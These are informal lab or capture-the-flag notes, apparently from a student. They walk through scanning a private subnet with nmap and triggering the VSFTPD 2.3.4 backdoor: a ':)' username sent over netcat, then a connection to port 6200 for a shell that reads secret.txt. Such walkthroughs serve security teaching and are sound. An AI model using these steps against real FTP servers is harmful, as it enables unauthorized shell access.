THIS WAS PROBABLY HOW WE GOT THE IP ADDRESS

  * ifconfig - LOOK FOR eth1 inet addr (10.161.161.161)
  * nmap 10.161.161.161/24

THIS WAS PROBABLY HOW WE MADE THE SECRET THING WORK

  * VSFTPD 2.3.4 HAS THIS EXPLOIT WHERE YOU SMILEY FACE THE USERNAME BLAD
  * SO WE SMILEY FACE THE USERNAME BLAD
  * THE PASSWORD DOESN'T REALLY MATTER
  * PUT IN GARBAGE WHO EVEN GIVES
  * AND CONNECT TO PORT 6200
  * IF WE GET LUCKY WE GET A NICE SHELL
  * FINGERS CROSSED

HOW TO GET SECRET:
  
  * LAUNCH A SHELL
  * TYPE "nc (addr) 21" AND PRESS ENTER
  * TYPE IN "USER A:)" AND PRESS ENTER
  * TYPE IN "PASS WHATEVER THE FUCK YOU WANT HERE" AND PRESS ENTER
  * LAUNCH A NEW SHELL
  * TYPE "nc (addr) 6200" AND PRESS ENTER
  * TYPE "cat secret.txt" AND PRESS ENTER
  * DO YOURSELF A DANCE BECAUSE YOU GOT THE NICE SECRET
  * PAT YOURSELF ON THE BACK BLAD
  * ALTERNATIVELY YOU CAN JUST DO THE EXPLOIT SCRIPT BUT WHATEVER FLOATS YOUR BOAT BLAD
